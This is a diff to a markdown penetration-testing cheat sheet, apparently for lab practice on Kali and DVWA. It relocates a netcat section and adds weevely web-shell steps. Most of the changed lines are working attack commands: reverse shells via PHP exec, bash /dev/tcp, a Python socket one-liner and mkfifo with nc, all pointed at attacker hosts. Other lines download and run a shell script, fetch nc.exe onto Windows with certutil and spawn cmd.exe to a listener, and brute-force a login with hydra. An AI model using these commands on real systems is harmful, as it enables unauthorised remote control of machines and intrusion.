@@ -21,6 +21,7 @@
 - [2. Endpoints Enum](#endpoint)
 - [3. Subdomain Enum](#subdomain)
 - [4. Hydra](#hydra)
+- [5. netcat](#nc)
 - [5.FTP](#ftp)
 - [6. SSH](#ssh)
 - [7. Mysql](#mysql)
@@ -31,7 +32,7 @@
 - [14. RDP-3389](#rdp)
 - [15. SMB](/smb.md)
 - [16. Metasploit](/metasploit.md)
-- [17. netcat](#nc)
+
 - [18. Reverse_Shell_Script](#rev)
 - [19. Privilege escalation](/Privilege.md)
 - [20. Email Harversting with theHarvester](#email)
@@ -93,6 +94,44 @@
 - Login page 
 - http://127.0.0.0/DVWA/vulnerabilities/brute/index.php
 - `hydra -l admin -P /usr/share/wordlists/rockyou.txt  127.0.0.1 http-post-form "/DVWA/vulnerabilities/brute/index.php:userField=^USER^:passwordField=^PASS^"`
+
+
+
+# 5. netcat <a name="nc"></a>
+- __`nc -lvnp 2323`__
+```php
+<?php
+ exec("/bin/bash -c 'bash -i >& /dev/tcp/attackerip/553 0>&1'");
+?>
+```
+```Bash
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+```
+```py
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<Your_ip>",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`
+```
+##### weevely
+- `weevely generate password ~/Desktop/shell.jpg`
+- `weevely <url_where_the_file_uploaded>/shell.jpg/shell.php password`
+
+### If you have commands to enter then use the below scripts
+```bash
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <Your_ip> 1234 > /tmp/f
+```
+```
+wget 10.8.1.72/shell.sh && bash shell.sh
+```
+__Download the reverse shell in windows__
+  - > __First we need to host the file in your kali linux__
+    - __`cd /usr/share/windows-binaries/`__
+    - __`python -m SimpleHTTPServer 80`__
+  - > __Go to the target windows system type the below command in the `cmd`__
+    - __`certutil -urlcache -f http://<attacker_ip>/nc.exe net.exe`__
+  - > __run the below command in kali linux__
+    > __`nc -nvlp 1234`__
+  - > __we need to run the file in target system__
+    - __`new.exe -nv <attacker ip> 1234 -e cmd.exe`__
+   
 
 
 # 5. FTP <a name="ftp"></a>
@@ -196,35 +235,6 @@ exploit
 
 
 
-# 14. netcat <a name="nc"></a>
-```php
-<?php
- exec("/bin/bash -c 'bash -i >& /dev/tcp/attackerip/553 0>&1'");
-?>
-```
-```Bash
-bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
-```
-```py
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<Your_ip>",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`
-```
-### If you have commands to enter then use the below scripts
-```bash
-rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <Your_ip> 1234 > /tmp/f
-```
-```
-wget 10.8.1.72/shell.sh && bash shell.sh
-```
-__Download the reverse shell in windows__
-  - > __First we need to host the file in your kali linux__
-    - __`cd /usr/share/windows-binaries/`__
-    - __`python -m SimpleHTTPServer 80`__
-  - > __Go to the target windows system type the below command in the `cmd`__
-    - __`certutil -urlcache -f http://<attacker_ip>/nc.exe net.exe`__
-  - > __run the below command in kali linux__
-    > __`nc -nvlp 1234`__
-  - > __we need to run the file in target system__
-    - __`new.exe -nv <attacker ip> 1234 -e cmd.exe`__
 
 
 # 16. Reverse_Shell_Script <a name="rev"></a> ---> (nc -lvnp 9001)
